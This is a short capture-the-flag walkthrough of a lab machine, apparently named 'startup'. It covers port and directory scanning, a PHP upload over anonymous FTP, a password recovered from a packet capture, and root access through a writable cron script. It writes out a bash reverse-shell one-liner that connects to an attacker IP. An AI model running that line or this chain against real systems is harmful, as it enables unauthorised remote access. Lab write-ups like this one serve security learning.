startup ctf
- 

1.) nmap scan for open ports, ftp, something with clues
-
- ![image](https://github.com/TekTristan/cyber-rooms/assets/92371193/10928f6c-fc5a-4747-881a-bc91e7f9b1a8)
- FTP Anonymous login allowed
- let me use gobuster first tho before trying.

2.) gobuster like a boss for those hidden directories
- 
- ![image](https://github.com/TekTristan/cyber-rooms/assets/92371193/65061e45-0cea-47f1-ae45-82ccf5ce2648)
- /files seems nice
- ![image](https://github.com/TekTristan/cyber-rooms/assets/92371193/dc43ff5c-5ba9-41a7-b4c0-afddf3529d0a)
- ![image](https://github.com/TekTristan/cyber-rooms/assets/92371193/e54ee8aa-84c7-4ca0-97fe-90bcfbd67ef1)
- ![image](https://github.com/TekTristan/cyber-rooms/assets/92371193/99187fe0-18fc-4023-ac59-bd22cf210103)
- i went on a circle run since i thought that Maya would be a user, and used Hydra, wasted my time.

3.) FTP into anonymous.
-
- ![image](https://github.com/TekTristan/cyber-rooms/assets/92371193/4edaac19-365f-431d-88c6-a8959f413e6e)
- i see that ftp has the same files as the url /files, so correctly thought to use some sort of injection, like PHP injection.
- and back in my nmap scan, it showed how the privleges are with /ftp as a directory
- ![image](https://github.com/TekTristan/cyber-rooms/assets/92371193/0768daef-dc97-4bbe-a820-58a006a075d5)
- ![image](https://github.com/TekTristan/cyber-rooms/assets/92371193/88300823-e08c-4727-afdd-dd3e433fca23)
- added the php file to ftp now i will go to the /files url and click on the file
- ![image](https://github.com/TekTristan/cyber-rooms/assets/92371193/2bfcf9a9-cecb-4d9f-b79a-ef12ebfe2dd0)
- ![image](https://github.com/TekTristan/cyber-rooms/assets/92371193/2117f7e0-0249-498a-b1e7-2fb1525d5340)

4.) now after finding the recipe, get into or find user.txt through privlege escalation.
- 
- through messing around and seeing the incidents directory, i wanted to grab the wiresharp pcapng file
- ![image](https://github.com/TekTristan/cyber-rooms/assets/92371193/ea897ee7-271b-4026-9539-48634e117b5f)
- ![image](https://github.com/TekTristan/cyber-rooms/assets/92371193/21aecb76-6b14-4523-92da-b9b53f8f5536)
- that ip is the website
- ![image](https://github.com/TekTristan/cyber-rooms/assets/92371193/54c34d45-7664-4c1c-a788-eccbe198da92)
- found password for lennie, yes
- 

5.) ssh into lennie
-
- ![image](https://github.com/TekTristan/cyber-rooms/assets/92371193/ff4c7212-26b9-4d1a-8999-7118a612bafe)
- ![image](https://github.com/TekTristan/cyber-rooms/assets/92371193/9bf8f11f-f0ae-4ff3-9677-0c34e4595251)
- found user flag.

6.) root time
-
-![image](https://github.com/TekTristan/cyber-rooms/assets/92371193/036208da-c5ba-482b-af63-1241495f3280)
-![image](https://github.com/TekTristan/cyber-rooms/assets/92371193/10d7763d-6abd-4590-9786-3ce4d97458a2)
- found my privleges within this file
- since i can edit and write on print.sh, need some sort of bash injection or exploit 
- ![image](https://github.com/TekTristan/cyber-rooms/assets/92371193/8a66baca-6fed-425d-95b5-ec407ea67e4d)
- bash -i >& /dev/tcp/10.2.107.89/9999 0>&1
- vim /etc/print.sh
    - ![image](https://github.com/TekTristan/cyber-rooms/assets/92371193/7ec26f77-53a6-4f2d-bd65-ab1caec33f10)
- ![Uploading image.png…]()
- done



